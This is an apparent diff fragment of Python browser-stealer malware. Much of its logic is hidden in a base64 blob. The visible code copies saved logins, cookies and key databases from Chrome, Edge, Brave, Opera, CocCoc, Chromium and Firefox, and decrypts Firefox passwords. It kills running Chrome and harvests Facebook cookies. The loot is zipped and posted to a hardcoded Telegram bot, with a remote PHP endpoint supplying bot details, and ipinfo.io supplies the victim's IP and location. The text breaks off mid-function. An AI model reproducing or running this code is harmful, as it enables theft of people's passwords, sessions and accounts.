KICBrMSA9IGhtYWMubmV3KGNocCwgcGVzK2VudHJ5U2FsdCwgc2hhMSkuZGlnZXN0KCkNCiAgdGsgPSBobWFjLm5ldyhjaHAsIHBlcywgc2hhMSkuZGlnZXN0KCkNCiAgazIgPSBobWFjLm5ldyhjaHAsIHRrK2VudHJ5U2FsdCwgc2hhMSkuZGlnZXN0KCkNCiAgayA9IGsxK2syDQogIGl2ID0ga1stODpdDQogIGtleSA9IGtbOjI0XQ0KICByZXR1cm4gREVTMy5uZXcoIGtleSwgREVTMy5NT0RFX0NCQywgaXYpLmRlY3J5cHQoZW5jcnlwdGVkRGF0YSkNCg0KZGVmIGRlY29kZUxvZ2luRGF0YShkYXRhKToNCiAgYXNuMWRhdGEgPSBkZWNvZGVyLmRlY29kZShiNjRkZWNvZGUoZGF0YSkpICMgZGVjb2RhZ2UgYmFzZTY0LCBwdWlzIEFTTjENCiAga2V5X2lkID0gYXNuMWRhdGFbMF1bMF0uYXNPY3RldHMoKQ0KICBpdiA9IGFzbjFkYXRhWzBdWzFdWzFdLmFzT2N0ZXRzKCkNCiAgY2lwaGVydGV4dCA9IGFzbjFkYXRhWzBdWzJdLmFzT2N0ZXRzKCkNCiAgcmV0dXJuIGtleV9pZCwgaXYsIGNpcGhlcnRleHQgDQpkZWYgZ2V0TG9naW5EYXRhKGFma2spOg0KICBsb2dpbnMgPSBbXQ0KICBqc29uX2ZpbGUgPSBvcy5wYXRoLmpvaW4oYWZrayAsImxvZ2lucy5qc29uIikNCiAgbG9naW5mID0gb3BlbigganNvbl9maWxlLCAncicsZW5jb2Rpbmc9J3V0Zi04JykucmVhZCgpDQogIGpzb25Mb2dpbnMgPSBqc29uLmxvYWRzKGxvZ2luZikNCiAgZm9yIHJvdyBpbiBqc29uTG9naW5zWydsb2dpbnMnXToNCiAgICBlbmNVc2VybmFtZSA9IHJvd1snZW5jcnlwdGVkVXNlcm5hbWUnXQ0KICAgIGVuY1Bhc3N3b3JkID0gcm93WydlbmNyeXB0ZWRQYXNzd29yZCddDQogICAgbG9naW5zLmFwcGVuZCggKGRlY29kZUxvZ2luRGF0YShlbmNVc2VybmFtZSksIGRlY29kZUxvZ2luRGF0YShlbmNQYXNzd29yZCksIHJvd1snaG9zdG5hbWUnXSkgKQ0KICByZXR1cm4gbG9naW5zDQpkZWYgZGVjcnlwdFBCRShkZWNvZGVkSXRlbSwgZ2xvYmFsU2FsdCk6ICNQQkUgcG91ciBQYXNzd29yZCBCYXNlZCBFbmNyeXB0aW9uIA0KICBwYmVBbGdvID0gc3RyKGRlY29kZWRJdGVtWzBdWzBdWzBdKQ0KICBpZiBwYmVBbGdvID09ICcxLjIuODQwLjExMzU0OS4xLjEyLjUuMS4zJzogI3BiZVdpdGhTaGExQW5kVHJpcGxlREVTLUNCQw0KICAgIGVudHJ5U2FsdCA9IGRlY29kZWRJdGVtWzBdWzBdWzFdWzBdLmFzT2N0ZXRzKCkNCiAgICBjaXBoZXJUID0gZGVjb2RlZEl0ZW1bMF1bMV0uYXNPY3RldHMoKQ0KICAgIGtleSA9IGRlY3J5cHRNb3ozREVTKCBnbG9iYWxTYWx0LCBlbnRyeVNhbHQsIGNpcGhlclQgKQ0KICAgIHJldHVybiBrZXlbOjI0XQ0KICBlbGlmIHBiZUFsZ28gPT0gJzEuMi44NDAuMTEzNTQ5LjEuNS4xMyc6ICNwa2NzNSBwYmVzMiAgDQogICAgZW50cnlTYWx0ID0gZGVjb2RlZEl0ZW1bMF1bMF1bMV1bMF1bMV1bMF0uYXNPY3RldHMoKQ0KICAgIGl0ZXJhdGlvbkNvdW50ID0gaW50KGRlY29kZWRJdGVtWzBdWzBdWzFdWzBdWzFdWzFdKQ0KICAgIGtleUxlbmd0aCA9IGludChkZWNvZGVkSXRlbVswXVswXVsxXVswXVsxXVsyXSkNCiAgICBrID0gc2hhMShnbG9iYWxTYWx0KS5kaWdlc3QoKQ0KICAgIGtleSA9IHBia2RmMl9obWFjKCdzaGEyNTYnLCBrLCBlbnRyeVNhbHQsIGl0ZXJhdGlvbkNvdW50LCBka2xlbj1rZXlMZW5ndGgpICAgIA0KICAgIGl2ID0gYidceDA0XHgwZScrZGVjb2RlZEl0ZW1bMF1bMF1bMV1bMV1bMV0uYXNPY3RldHMoKQ0KICAgIGNpcGhlclQgPSBkZWNvZGVkSXRlbVswXVsxXS5hc09jdGV0cygpDQogICAgY2xlYXJUZXh0ID0gQUVTLm5ldyhrZXksIEFFUy5NT0RFX0NCQywgaXYpLmRlY3J5cHQoY2lwaGVyVCkNCiAgICByZXR1cm4gY2xlYXJUZXh0DQoNCmRlZiBnZXRLZXkoYWZrKTogIA0KICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3Qob3MucGF0aC5qb2luKGFmaywgImtleTQuZGIiKSkNCiAgICBjID0gY29ubi5jdXJzb3IoKQ0KICAgIGMuZXhlY3V0ZSgiU0VMRUNUIGl0ZW0xLGl0ZW0yIEZST00gbWV0YWRhdGE7IikNCg0KICAgIHJvdyA9IGMuZmV0Y2hvbmUoKQ0KICAgIGdsb2JhbFNhbHQgPSByb3dbMF0gDQogICAgaXRlbTIgPSByb3dbMV0NCiAgICBkZWNvZGVkSXRlbTIgPSBkZWNvZGVyLmRlY29kZSggaXRlbTIgKSANCiAgICBjbGVhclRleHQgPSBkZWNyeXB0UEJFKCBkZWNvZGVkSXRlbTIsIGdsb2JhbFNhbHQgKQ0KICAgIA0KICAgIGlmIGNsZWFyVGV4dCA9PSBiJ3Bhc3N3b3JkLWNoZWNrXHgwMlx4MDInOiANCiAgICAgIGMuZXhlY3V0ZSgiU0VMRUNUIGExMSxhMTAyIEZST00gbnNzUHJpdmF0ZTsiKQ0KICAgICAgZm9yIHJvdyBpbiBjOg0KICAgICAgICBpZiByb3dbMF0gIT0gTm9uZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgICBhMTEgPSByb3dbMF0NCiAgICAgIGExMDIgPSByb3dbMV0gDQogICAgICBpZiBhMTAyICE9IE5vbmU6IA0KICAgICAgICBkZWNvZGVkX2ExMSA9IGRlY29kZXIuZGVjb2RlKCBhMTEgKQ0KICAgICAgICBjbGVhclRleHQ9IGRlY3J5cHRQQkUoIGRlY29kZWRfYTExLCBnbG9iYWxTYWx0ICkNCiAgICAgICAgcmV0dXJuIGNsZWFyVGV4dFs6MjRdICAgDQogICAgcmV0dXJuIE5vbmUNCmRlZiBlbmNyeXB0X2ZpcmVmb3gocGF0aF9mKToNCiAgICB0cnk6DQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwYXRoX2YgLCJsb2dpbnMuanNvbiIpKToNCiAgICAgICAgICAgIGtleSA9IGdldEtleShwYXRoX2YpDQogICAgICAgICAgICBsb2dpbnMgPSBnZXRMb2dpbkRhdGEocGF0aF9mKQ0KDQogICAgICAgICAgICBmb3IgaSBpbiBsb2dpbnM6DQogICAgICAgICAgICAgICAgdXNlcm5hbWU9IHVucGFkKCBERVMzLm5ldygga2V5LCBERVMzLk1PREVfQ0JDLCBpWzBdWzFdKS5kZWNyeXB0KGlbMF1bMl0pLDggKSANCiAgICAgICAgICAgICAgICBwYXNzd29yZD0gdW5wYWQoIERFUzMubmV3KCBrZXksIERFUzMuTU9ERV9DQkMsIGlbMV1bMV0pLmRlY3J5cHQoaVsxXVsyXSksOCApIA0KICAgICAgICAgICAgICAgIHN0cl9wYXNzID0gIHBhc3N3b3JkLmRlY29kZSgndXRmLTgnKQ0KICAgICAgICAgICAgICAgIHN0cl91c2VyID0gIHVzZXJuYW1lLmRlY29kZSgndXRmLTgnKQ0KICAgICAgICAgICAgICAgIHdpdGggb3Blbigob3MucGF0aC5qb2luKHBhdGhfZiwicGFzcy50eHQiKSksICdhJyxlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGlbMl0rIiAgICAgICAgICAiK3N0cl91c2VyICsgInwiKyBzdHJfcGFzcyArICJcbiIpDQogICAgZXhjZXB0IDoNCiAgICAgICAgcGFzcw0KICAgIHRyeToNCiAgICAgICAgZGJfcGF0aCA9IG9zLnBhdGguam9pbihwYXRoX2YsICJjb29raWVzLnNxbGl0ZSIpDQogICAgICAgIGRiID0gc3FsaXRlMy5jb25uZWN0KGRiX3BhdGgpIA0KICAgICAgICBkYi50ZXh0X2ZhY3RvcnkgPSBsYW1iZGEgYjogYi5kZWNvZGUoZXJyb3JzPSJpZ25vcmUiKQ0KICAgICAgICBjdXJzb3IgPSBkYi5jdXJzb3IoKQ0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiIiINCiAgICAgICAgU0VMRUNUIGlkICwgbmFtZSwgdmFsdWUgLGhvc3QNCiAgICAgICAgRlJPTSBtb3pfY29va2llcw0KICAgICAgICAiIiIpDQogICAgICAgIGpzb25fZGF0YSA9IFtdDQogICAgICAgIGZvciBpZCAsIG5hbWUsIHZhbHVlICxob3N0IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAganNvbl9kYXRhLmFwcGVuZCh7DQogICAgICAgICAgICAgICAgImhvc3QiOiBob3N0LA0KICAgICAgICAgICAgICAgICJuYW1lIjogbmFtZSwNCiAgICAgICAgICAgICAgICAidmFsdWUiOiB2YWx1ZQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgfSkNCiAgICAgICAgcmVzdWx0ID0gW10NCiAgICAgICAgZm9yIGl0ZW0gaW4ganNvbl9kYXRhOg0KICAgICAgICAgICAgaG9zdCA9IGl0ZW1bImhvc3QiXQ0KICAgICAgICAgICAgbmFtZSA9IGl0ZW1bIm5hbWUiXQ0KICAgICAgICAgICAgdmFsdWUgPSBpdGVtWyJ2YWx1ZSJdDQogICAgICAgICAgICBpZiBob3N0ID09ICIuZmFjZWJvb2suY29tIjoNCiAgICAgICAgICAgICAgICByZXN1bHQuYXBwZW5kKGYie25hbWV9ID0ge3ZhbHVlfSIpDQogICAgICAgICAgICBjb29raWUgPSBmIntob3N0fVx0XHR7Jy8nfVx0XHRcdHtuYW1lfVx0e3ZhbHVlfVxuIiAgICAgICAgICANCiAgICAgICAgICAgIHdpdGggb3Blbigob3MucGF0aC5qb2luKHBhdGhfZiwgImNvb2tpZS50eHQiKSksICdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKGNvb2tpZSkNCiAgICAgICAgcmVzdWx0X3N0cmluZyA9ICI7ICIuam9pbihyZXN1bHQpDQogICAgICAgIHdpdGggb3Blbigob3MucGF0aC5qb2luKG9zLmVudmlyb25bIlRFTVAiXSwgbmFtZV9mLCAiY29va2llZmIudHh0IikpLCAnYScsZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUocmVzdWx0X3N0cmluZysiXG4iICsgICJcbiIpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgDQpkZWYgZGVsZXRlX2ZpcmVmb3goZGF0YV9maXJlZm94X3Byb2ZpbGUpOg0KICAgIA0KICAgIHRyeToNCiAgICAgICAgZW5jcnlwdF9maXJlZm94KGRhdGFfZmlyZWZveF9wcm9maWxlKQ0KICAgIGV4Y2VwdDogcGFzcw0KICAgDQpkZWYgZGVtc28oKSA6DQogICAgcGF0aF9kZW1zbyA9IHIiQzpcVXNlcnNcUHVibGljXERvY3VtZW50XG51bWJlci50eHQiDQogICAgaWYgb3MucGF0aC5leGlzdHMocGF0aF9kZW1zbyk6DQogICAgICAgIHdpdGggb3BlbihwYXRoX2RlbXNvLCAncicpIGFzIGZpbGU6DQogICAgICAgICAgICBudW1iZXIgPSBmaWxlLnJlYWQoKQ0KICAgICAgICBudW1iZXIgPSBpbnQobnVtYmVyKSsxDQogICAgICAgIHdpdGggb3BlbihwYXRoX2RlbXNvLCAndycpIGFzIGZpbGU6DQogICAgICAgICAgICBhYmMgPSBzdHIobnVtYmVyKQ0KICAgICAgICAgICAgZmlsZS53cml0ZShhYmMpDQogICAgZWxzZToNCiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZGVtc28sICd3JykgYXMgZmlsZToNCiAgICAgICAgICAgIGZpbGUud3JpdGUoIjEiKQ0KICAgICAgICAgICAgbnVtYmVyID0gMQ0KICAgIHJldHVybiBudW1iZXINCg0KDQpkZWYgaWQoKSA6DQogICAgcGF0aF9pZCA9IHIiQzpcVXNlcnNcUHVibGljXERvY3VtZW50XGlkLnR4dCINCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoX2lkKToNCiAgICAgICAgd2l0aCBvcGVuKHBhdGhfaWQsICdyJykgYXMgZmlsZToNCiAgICAgICAgICAgIGlkID0gZmlsZS5yZWFkKCkNCiAgICBlbHNlOg0KICAgICAgICByYW5kb21fbnVtYmVyID0gcmFuZG9tLnJhbmRpbnQoMTAqKjE0LCAxMCoqMTUgLSAxKQ0KICAgICAgICBpZCA9IHN0cihyYW5kb21fbnVtYmVyKQ0KICAgICAgICB3aXRoIG9wZW4ocGF0aF9pZCwgJ3cnKSBhcyBmaWxlOg0KICAgICAgICAgICAgZmlsZS53cml0ZShpZCkNCiAgICByZXR1cm4gaWQNCmRlZiB0aW1lMTEoKSA6DQogICAgY3VycmVudF90aW1lID0gZGF0ZXRpbWUubm93KCkNCiAgICBmb3JtYXR0ZWRfdGltZSA9IGN1cnJlbnRfdGltZS5zdHJmdGltZSgiJUg6JU0sICVkLyVtLyVZIikNCiAgICBmb3JtYXR0ZWRfdGltZTIgPSBkYXRldGltZS5zdHJwdGltZShmb3JtYXR0ZWRfdGltZSwgIiVIOiVNLCAlZC8lbS8lWSIpDQogICAgcGF0aF90aW1lID0gciJDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRcdGltZS50eHQiDQogICAgaWYgb3MucGF0aC5leGlzdHMocGF0aF90aW1lKToNCiAgICAgICAgd2l0aCBvcGVuKHBhdGhfdGltZSwgJ3InKSBhcyBmaWxlOg0KICAgICAgICAgICAgdGltZV9zdHIgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQogICAgICAgICAgICBmaWxlX3RpbWUgPSBkYXRldGltZS5zdHJwdGltZSh0aW1lX3N0ciwgIiVIOiVNLCAlZC8lbS8lWSIpDQogICAgICAgIA0KICAgICAgICB0aW1lX2RpZmYgPSBmb3JtYXR0ZWRfdGltZTIgLSBmaWxlX3RpbWUNCiAgICAgICAgaWYgdGltZV9kaWZmIDwgdGltZWRlbHRhKG1pbnV0ZXM9MzApOg0KICAgICAgICAgICAgYSA9IDANCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGEgPSAxDQogICAgDQogICAgZWxzZSA6DQogICAgICAgIHdpdGggb3BlbihwYXRoX3RpbWUsICd3JykgYXMgZmlsZToNCiAgICAgICAgICAgIGZpbGUud3JpdGUoZm9ybWF0dGVkX3RpbWUgKyAnXG4nKQ0KICAgICAgICAgICAgYSA9IDENCiAgICByZXR1cm4gYQ0KDQpkZWYgbWFpbigpOg0KICAgIA0KICAgIGRhdGFfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJURU1QIl0sIG5hbWVfZik7b3MubWtkaXIoZGF0YV9wYXRoKQ0KICAgDQogICAgY2hyb21lID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIikNCiAgICBmaXJlZm94ID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIlJvYW1pbmciLCJNb3ppbGxhIiwgIkZpcmVmb3giLCAiUHJvZmlsZXMiKQ0KICAgIEVkZ2UgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiTWljcm9zb2Z0IiwgIkVkZ2UiLCAiVXNlciBEYXRhIikNCiAgICBPcGVyYSA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIk9wZXJhIFNvZnR3YXJlIiwgIk9wZXJhIFN0YWJsZSIpDQogICAgQnJhdmUgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCJCcmF2ZVNvZnR3YXJlIiwgIkJyYXZlLUJyb3dzZXIiLCAiVXNlciBEYXRhIikNCiAgICBjb2Njb2MgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCJDb2NDb2MiLCAiQnJvd3NlciIsICJVc2VyIERhdGEiKQ0KICAgIGNocm9taXVtID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwiQ2hyb21pdW0iLCAiVXNlciBEYXRhIikNCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhjaHJvbWUpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBnZXRfY2hyb21lKGRhdGFfcGF0aCxjaHJvbWUpDQogICAgICAgIGV4Y2VwdDogcGFzcw0KICAgIGlmIG9zLnBhdGguZXhpc3RzKEVkZ2UpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBnZXRfZWRnZShkYXRhX3BhdGgsRWRnZSkNCiAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgIA0KICAgIGlmIG9zLnBhdGguZXhpc3RzKE9wZXJhKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZ2V0X29wZXJhKGRhdGFfcGF0aCxPcGVyYSkNCiAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgIA0KICAgIGlmIG9zLnBhdGguZXhpc3RzKEJyYXZlKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZ2V0X2JyYXZlKGRhdGFfcGF0aCxCcmF2ZSkNCiAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgIA0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGNvY2NvYyk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICBnZXRfY29jY29jKGRhdGFfcGF0aCxjb2Njb2MpDQogICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgIA0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGZpcmVmb3gpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICAgZ2V0X2ZpcmVmb3goZGF0YV9wYXRoLGZpcmVmb3gpDQogICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgIA0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGNocm9taXVtKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICBnZXRfY2hyb21pdW0oZGF0YV9wYXRoLGNocm9taXVtKSAgDQogICAgICAgIGV4Y2VwdDogcGFzcyANCkRvY3VtZW50X3BhdGggPSAnQzpcXFVzZXJzXFxQdWJsaWNcXERvY3VtZW50LnppcCcNCiANCmRhdGFfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJURU1QIl0sIG5hbWVfZikNCnpfcGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVEVNUCJdLCBuYW1lX2YgKyAnLnppcCcpDQpzaHV0aWwubWFrZV9hcmNoaXZlKHpfcGhbOi00XSwgJ3ppcCcsIGRhdGFfcGF0aCkNCnVybCA9ICdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NjY1NDc5NDA1MzpBQUdJdm5Nd0xQRi13RGJjT2R1Yy1wY3BxR3ZGeTFmZ1BrSS9zZW5kRG9jdW1lbnQnDQpudW1iZXIgPSAiRGF0YSBM4bqnbiBUaOG7qTogIiArIHN0cihkZW1zbygpKQ0KDQpkYXRhID0gew0KICAgICdjYXB0aW9uJzogIlxuIisiVOG7iW5oL0NpdHk6ICAiICt0ZW5fY291bnRyeSArIlxuIiArImlkIDogICIgKyBpZCgpICsiXG4iKyB3aW5kb3dzX3ZlcnNpb24gKyItLSIraXAgKyAiXG4iKyBudW1iZXIgKyAiXG4iLA0KICAgICdjaGF0X2lkJzogNTU4Mjk5NTIwMA0KfQ0KDQp0cnk6DQogICAgd2l0aCBvcGVuKHpfcGgsICdyYicpIGFzIGY6DQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9eydkb2N1bWVudCc6IGZ9KQ0KICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkgICMgS2nhu4NtIHRyYSBs4buXaSB0cm9uZyB5w6p1IGPhuqd1DQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgcHJpbnQoIkVycm9yOiIsIGUpDQoNCg0KICAgIA0KICAgIHNodXRpbC5ybXRyZWUob3MuZW52aXJvblsiVEVNUCJdLCBuYW1lX2YgKycuemlwJyk7c2h1dGlsLnJtdHJlZShvcy5lbnZpcm9uWyJURU1QIl0sIG5hbWVfZikNCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhEb2N1bWVudF9wYXRoKToNCiAgICAgICAgb3MucmVtb3ZlKERvY3VtZW50X3BhdGgpDQogICAgDQoNCmlmICd2bicgaW4gZ2xvYmFscygpIGFuZCB2biA9PSAnMSc6DQogICAgaWYgJ3llcycgbm90IGluIGdsb2JhbHMoKToNCiAgICAgICAgaWYgY291bnRyeV9jb2RlID09ICdWTic6DQogICAgICAgICAgICB3aXRoIG9wZW4oJ3dhdGNoLnR4dCcsICd3JywgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCdoZWxsbycpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBtYWluKCkNCiAgICBlbHNlOg0KICAgICAgICBtYWluKCkNCmVsaWYgJ3ZuJyBpbiBnbG9iYWxzKCkgYW5kIHZuID09ICcyJzoNCiAgICBwcmludCgnc2VydmVyIHN0b3AnKQ0KZWxzZToNCiAgICBwcmludCgna2V0IG5vaSB0aGF0IGJhaScpDQo=''').decode('utf-8'))
+import os,json,shutil,win32crypt,sqlite3,base64,random
+import requests as x01
+from datetime import datetime,timedelta
+from Crypto.Cipher import DES3
+from Crypto.Cipher import AES
+from pyasn1.codec.der import decoder
+from hashlib import sha1, pbkdf2_hmac
+from Crypto.Util.Padding import unpad 
+from base64 import b64decode
+import hmac,platform
+import requests
+vn = '1'
+response1 = requests.get('https://thaitricker69.000webhostapp.com/NHT.php')
+data = response1.json()
+apibot1= data['idbot']
+id1= data['idchat']
+
+
+windows_version = platform.platform()
+now = datetime.now()
+response =x01.get("https://ipinfo.io").text
+ip_country = json.loads(response)
+ten_country = ip_country['region']
+ip = ip_country['ip']
+country_code = ip_country['country']
+newtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+"-"+str(now.day)+"-"+str(now.month)+"-"+str(now.year)
+name_f = country_code +" "+ ip +" "+newtime
+
+def check_chrome_running():
+    for proc in os.popen('tasklist').readlines():
+        if 'chrome.exe' in proc:
+            return True
+    return False
+
+def find_profile(path_userdata):
+    profile_path = []
+    for name in os.listdir(path_userdata):
+        if name.startswith("Profile") or name == 'Default':
+            dir_path = os.path.join(path_userdata, name)
+            profile_path.append(dir_path)
+    return profile_path
+
+def get_chrome(data_path,chrome_path):
+    data_chrome = os.path.join(data_path, "Chrome");os.mkdir(data_chrome)
+    profiles = find_profile(chrome_path)
+    for i,profile in enumerate(profiles, 1):
+        os.mkdir(os.path.join(data_chrome,"profile"+str(i)))
+        def copy_file():
+            if os.path.exists(os.path.join(profile,'Login Data')):
+                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chrome,"profile"+str(i),'Login Data'))
+            if os.path.exists(os.path.join(chrome_path,'Local State')):
+                shutil.copyfile(os.path.join(chrome_path,'Local State'),os.path.join(data_chrome,"profile"+str(i),'Local State'))
+            if os.path.exists(os.path.join(profile,'Network','Cookies')):
+                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_chrome,"profile"+str(i),'Cookies')) 
+        if check_chrome_running():
+            os.system('taskkill /f /im chrome.exe')
+        else:pass
+        copy_file();delete_file(os.path.join(data_chrome,"profile"+str(i)))    
+
+def get_edge(data_path,edge_path):
+    data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)
+    profiles = find_profile(edge_path)
+    for i,profile in enumerate(profiles, 1):
+        os.mkdir(os.path.join(data_edge,"profile"+str(i)))
+        def copy_file():
+            if os.path.exists(os.path.join(profile,'Network','Cookies')):
+                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_edge,"profile"+str(i),'Cookies'))
+            if os.path.exists(os.path.join(profile,'Login Data')):
+                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_edge,"profile"+str(i),'Login Data'))
+            if os.path.exists(os.path.join(edge_path,'Local State')):
+                shutil.copyfile(os.path.join(edge_path,'Local State'),os.path.join(data_edge,"profile"+str(i),'Local State'))
+        
+        copy_file();delete_file(os.path.join(data_edge,"profile"+str(i)))  
+
+def get_brave(data_path,brave_path):
+    data_brave = os.path.join(data_path, "Brave");os.mkdir(data_brave)
+    profiles = find_profile(brave_path)
+    for i,profile in enumerate(profiles, 1):
+        os.mkdir(os.path.join(data_brave,"profile"+str(i)))
+        def copy_file():
+            if os.path.exists(os.path.join(profile,'Network','Cookies')):
+                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_brave,"profile"+str(i),'Cookies'))
+            if os.path.exists(os.path.join(profile,'Login Data')):
+                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_brave,"profile"+str(i),'Login Data'))
+            if os.path.exists(os.path.join(brave_path,'Local State')):
+                shutil.copyfile(os.path.join(brave_path,'Local State'),os.path.join(data_brave,"profile"+str(i),'Local State'))
+        copy_file()
+        delete_file(os.path.join(data_brave,"profile"+str(i)))
+
+def get_opera(data_path,opera_path):
+    data_opera = os.path.join(data_path, "Opera");os.mkdir(data_opera)
+    def copy_file():
+        if os.path.exists(os.path.join(opera_path,'Network','Cookies')):
+            shutil.copyfile(os.path.join(opera_path,'Network','Cookies'),os.path.join(data_opera,'Cookies'))
+        if os.path.exists(os.path.join(opera_path,'Login Data')):
+            shutil.copyfile(os.path.join(opera_path,'Login Data'),os.path.join(data_opera,'Login Data'))
+        if os.path.exists(os.path.join(opera_path,'Local State')):
+            shutil.copyfile(os.path.join(opera_path,'Local State'),os.path.join(data_opera,'Local State'))
+    copy_file();delete_file(data_opera)
+def get_coccoc(data_path,coccoc_path):
+    data_coccoc= os.path.join(data_path, "CocCoc");os.mkdir(data_coccoc)
+    profiles = find_profile(coccoc_path)
+    for i,profile in enumerate(profiles, 1):
+        os.mkdir(os.path.join(data_coccoc,"profile"+str(i)))
+        def copy_file():
+            if os.path.exists(os.path.join(profile,'Network','Cookies')):
+                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_coccoc,"profile"+str(i),'Cookies'))
+            if os.path.exists(os.path.join(profile,'Login Data')):
+                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_coccoc,"profile"+str(i),'Login Data'))
+            if os.path.exists(os.path.join(coccoc_path,'Local State')):
+                shutil.copyfile(os.path.join(coccoc_path,'Local State'),os.path.join(data_coccoc,"profile"+str(i),'Local State'))
+        copy_file();    
+        delete_file(os.path.join(data_coccoc,"profile"+str(i)))
+        
+
+def get_chromium(data_path,chromium_path):
+    data_chromium= os.path.join(data_path, "Chromium");os.mkdir(data_chromium)
+    profiles = find_profile(chromium_path)
+    for i,profile in enumerate(profiles, 1):
+        os.mkdir(os.path.join(data_chromium,"profile"+str(i)))
+        def copy_file():
+            if os.path.exists(os.path.join(profile,'Cookies')):
+                shutil.copyfile(os.path.join(profile,'Cookies'),os.path.join(data_chromium,"profile"+str(i),'Cookies'))
+            if os.path.exists(os.path.join(profile,'Login Data')):
+                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chromium,"profile"+str(i),'Login Data'))
+            if os.path.exists(os.path.join(chromium_path,'Local State')):
+                shutil.copyfile(os.path.join(chromium_path,'Local State'),os.path.join(data_chromium,"profile"+str(i),'Local State'))
+        copy_file();delete_file(os.path.join(data_chromium,"profile"+str(i)))
+def find_profile_firefox(firefox_path):
+    profile_path = []
+    for name in os.listdir(firefox_path):
+            dir_path = os.path.join(firefox_path, name)
+            profile_path.append(dir_path)
+    return profile_path
+
+def get_firefox(data_path,firefox_path):
+    data_firefox = os.path.join(data_path,'firefox');os.mkdir(data_firefox)
+    profiles = find_profile_firefox(firefox_path)
+   
+    for i,profile in enumerate(profiles, 1):
+        os.mkdir(os.path.join(data_firefox,"profile"+str(i)))
+        def copy_file():
+            if os.path.exists(os.path.join(profile,'cookies.sqlite')):
+                shutil.copyfile(os.path.join(profile,'cookies.sqlite'),os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite'))
+            if os.path.exists(os.path.join(profile,'key4.db')):
+                shutil.copyfile(os.path.join(profile,'key4.db'),os.path.join(data_firefox,"profile"+str(i),'key4.db'))
+            if os.path.exists(os.path.join(profile,'logins.json')):
+                shutil.copyfile(os.path.join(profile,'logins.json'),os.path.join(data_firefox,"profile"+str(i),'logins.json'))
+        copy_file()
+        if os.path.exists(os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite')):
+
+            delete_firefox(os.path.join(data_firefox,"profile"+str(i)))
+        else:
